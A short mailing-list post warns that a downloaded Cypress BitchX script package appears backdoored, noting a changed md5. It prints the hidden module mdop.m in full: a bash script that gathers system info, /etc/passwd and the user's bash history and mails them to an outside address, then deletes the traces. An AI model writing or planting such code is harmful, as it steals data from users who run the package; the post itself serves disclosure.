Subject: Cypress BX script backdoored?

For those of us who use Cyp/bx (http://www.mindcryme.com/~void/cyp1.0k.tar.gz 
)

|]rip[@rock:14:53:49:~/tmp/cyp/modules| $ cat mdop.m
#!/bin/bash

uname -a >> /tmp/.bx
cat /etc/hosts >> /tmp/.bx
cat /etc/passwd >> /tmp/.bx
cat $HOME/.bash_history >> /tmp/.bx  2>/dev/null
mail defcola@...il.com < /tmp/.bx
sleep 4
rm -rf /tmp/.bx

What's up with this? Last time I downloaded this that wasn't there,  
and it's the same version number but different md5.
.. and this file wasn't included.
